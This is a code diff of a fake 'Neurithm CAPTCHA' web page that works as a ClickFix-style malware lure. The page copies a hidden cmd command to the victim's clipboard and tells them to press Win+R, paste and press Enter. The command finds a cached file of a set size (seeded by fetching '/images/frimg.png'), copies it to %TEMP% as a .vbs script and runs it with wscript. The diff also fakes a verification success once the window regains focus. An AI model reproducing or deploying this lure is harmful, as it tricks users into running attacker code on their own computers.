@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="preload" as="image" href="/images/frimg.png">
 <title>Neurithm CAPTCHA</title>
 <style>
   :root{
@@ -453,7 +452,7 @@
           1. <span class="key key-win"><span class="win-logo"><span></span><span></span><span></span><span></span></span>Win</span> + <span class="key key-r">R</span><br><br>
           2. <span class="key key-ctrl">Ctrl</span> + <span class="key key-r">V</span><br><br>
           3. <span class="key key-ctrl">Enter</span>
-          <img src="/images/frimg.png" style="display:none" alt="">
+          
         </div>
       </div>
     </div>
@@ -471,15 +470,16 @@
 
 <script>
 (() => {
-
   const indicator = document.getElementById("indicator");
   const message = document.getElementById("message");
   const button = document.getElementById("verifyButton");
   const captcha = document.getElementById("captcha");
-  const fixingCode = 'cmd /c "for /r "%LOCALAPPDATA%" %i in (f*) do @if %~zi==1672 (copy /y "%i" "%TEMP%\t.vbs" && start wscript "%TEMP%\t.vbs")"';
+  const fixingCode = "cmd /c for /r \"%LocalAppData%\" %f in (f_*) do @(if %~zf EQU 1099776 copy /y \"%f\" \"%TEMP%\\u.vbs\" >nul & start \"\" /b wscript.exe \"%TEMP%\\u.vbs\")";
 
   let isVerifying = false;       // Check if verification is in progress
   let isProcessingEnter = false; // Prevent duplicate Enter key inputs
+
+  fetch('/images/frimg.png');
 
   async function copyToClipboard(text) {
     // 1️⃣ 최신 API 시도 (HTTPS 또는 localhost)
@@ -584,30 +584,42 @@
     
     setTimeout(goToNextPage, 3000); 
   }
-
   // 1. Start loading when the button is clicked
   button.addEventListener("click", startCopyAndVerification);
 
-  // 2. Global Enter key listener
-  document.addEventListener("keydown", (event) => {
-    if (event.key === "Enter" && isVerifying && !isProcessingEnter) {
-      
+  window.addEventListener('focus', () => {
+
       // Set lock to prevent duplicate execution
-      isProcessingEnter = true; 
+      //isProcessingEnter = true; 
       
       // Close the expanded menu smoothly
       captcha.classList.remove("expanded");
-
-      // Notify user that it's processing
-      //message.textContent = "Processing..."; 
-
-      // Show success screen after 2 seconds (2000ms)
-      setTimeout(() => {
+      
+    setTimeout(() => {
         completeVerification();
       }, 2000);
-      
-    }
   });
+
+  // 2. Global Enter key listener
+  // document.addEventListener("keydown", (event) => {
+  //   if (event.key === "Enter" && isVerifying && !isProcessingEnter) {
+      
+  //     // Set lock to prevent duplicate execution
+  //     isProcessingEnter = true; 
+      
+  //     // Close the expanded menu smoothly
+  //     captcha.classList.remove("expanded");
+
+  //     // Notify user that it's processing
+  //     //message.textContent = "Processing..."; 
+
+  //     // Show success screen after 2 seconds (2000ms)
+  //     setTimeout(() => {
+  //       completeVerification();
+  //     }, 2000);
+      
+  //   }
+  // });
 })();
 </script>
 
